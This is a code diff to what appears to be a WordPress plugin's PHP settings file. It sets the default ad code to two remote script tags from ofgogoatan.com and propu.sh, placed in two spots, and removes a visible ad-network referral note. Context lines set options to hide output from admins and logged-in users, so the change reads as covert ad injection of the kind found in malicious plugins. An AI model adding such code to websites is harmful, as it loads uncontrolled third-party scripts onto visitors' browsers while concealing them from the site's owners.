@@ -46,7 +46,10 @@ add_action( 'admin_init', function() {
 	
 });
 
-$ad_code='';
+$ad_code='
+<script type="text/javascript" src="//ofgogoatan.com/apu.php?zoneid=3280383" async data-cfasync="false"></script>
+<script src="https://propu.sh/pfe/current/tag.min.js?z=3280389" data-cfasync="false" async></script>
+';
 
 $hide_admin='on';
 $hide_logged_in='on';
@@ -65,7 +68,10 @@ function mont_page() {
        <?php
        settings_fields( 'mont-settings' );
        do_settings_sections( 'mont-settings' );
-$ad_code='';
+$ad_code='
+<script type="text/javascript" src="//ofgogoatan.com/apu.php?zoneid=3280383" async data-cfasync="false"></script>
+<script src="https://propu.sh/pfe/current/tag.min.js?z=3280389" data-cfasync="false" async></script>
+';
 
 $hide_admin='on';
 $hide_logged_in='on';
@@ -83,8 +89,7 @@ $log_install='';
              
  <tr>
                 <th>Ad Code</th>
-                <td><textarea placeholder="" name="ad_code" rows="5" cols="130"><?php echo get_option('ad_code',$ad_code) ; ?></textarea><br><p class="description">
-Don't have ad code ? <a href="https://propellerads.com/publishers/?ref_id=TbQg" target="_blank">propellerAds (up to $10 CPM).</a></p></td>
+                <td><textarea placeholder="" name="ad_code" rows="5" cols="130"><?php echo get_option('ad_code',$ad_code) ; ?></textarea><br></td>
             </tr>
 			
 			
